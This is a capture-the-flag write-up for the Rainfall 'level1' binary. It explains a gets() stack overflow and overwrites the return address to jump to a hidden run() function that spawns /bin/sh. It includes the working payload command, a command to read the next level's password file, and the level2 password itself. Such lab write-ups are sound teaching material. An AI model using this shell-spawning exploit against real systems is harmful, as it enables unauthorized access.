# Rainfall Level1 - Executive Summary

## The Attack in 4 Steps

### 1. **main() uses gets() - VULNERABLE**
```c
int main() {
    char buffer[64];
    gets(buffer);  //  Doesn't check size
    return 0;
}
```
- Buffer of 64 bytes
- `gets()` has no limit → we can write 1000 bytes
- When we write more than 64, we overwrite adjacent memory

---

### 2. **We find run() - THE HIDDEN FUNCTION**
```bash
gdb level1
(gdb) info functions
```
```
0x08048444  run    ← Here it is!
```

```bash
(gdb) disassemble run
```
```asm
call system@plt    ; Executes system("/bin/sh")
```

**run() gives us a shell**, but main() never calls it. We need to force the jump.

---

### 3. **The Return Address - OUR TARGET**

**Stack when main() executes:**
```
[Return Address: 0xXXXX]  ← We want to write 0x08048444 here
[Saved EBP: 4 bytes]
[Space: 12 bytes]
[Buffer: 64 bytes]        ← gets() writes here
```

**Distance from buffer to Return Address:**
- 64 bytes (buffer) + 12 bytes (space) = **76 bytes**

**The plan:**
1. Fill 76 bytes with junk ("A"s)
2. The next 4 bytes we fill with `0x08048444` (run's address)
3. When main() does `return`, it reads the Return Address
4. Finds `0x08048444` → jumps to run()
5. run() executes `/bin/sh` → shell!

---

### 4. **The Exploit - LITTLE-ENDIAN**

**Address of run:** `0x08048444`

**In little-endian (reversed):** `\x44\x84\x04\x08`

**Complete payload:**
```python
"A" * 76 + "\x44\x84\x04\x08"
└─ padding ┘ └── run() ───┘
```

**Execution:**
```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

**What happens?**
```
gets() reads → Writes 80 bytes → Overwrites Return Address
main() ends → ret reads 0x08048444 → Jumps to run()
run() executes → system("/bin/sh") → Shell as level2
```

---

## 📊 Attack Visualization

### BEFORE the exploit:
```
[Return: back to libc]
[Saved EBP]
[Buffer: empty]
```

### AFTER the exploit:
```
[Return: 0x08048444 ✓]  ← CHANGED!
[Saved EBP: AAAA]
[Buffer: AAAA...AAAA]
```

### When it returns:
```
ret → Reads 0x08048444 → Jumps to run() → system("/bin/sh") → $ whoami → level2
```

---

## Summary

| Concept | Explanation |
|---------|-------------|
| **gets()** | Vulnerable function that doesn't check buffer size |
| **Buffer 64 bytes** | Space for data, but we can write more |
| **Return Address** | Address where the function jumps when it finishes |
| **run()** | Hidden function at `0x08048444` that executes `/bin/sh` |
| **Exploit** | 76 bytes junk + 4 bytes run's address |
| **Little-endian** | `0x08048444` is written as `\x44\x84\x04\x08` |
| **Result** | Overwrite Return → Jump to run() → Shell as level2 |

---

## Essential Commands

```bash
# 1. Find run's address
gdb level1
(gdb) info functions

# 2. Execute exploit
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1

# 3. Get password
whoami
cat /home/user/level2/.pass
```

**Password:** `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`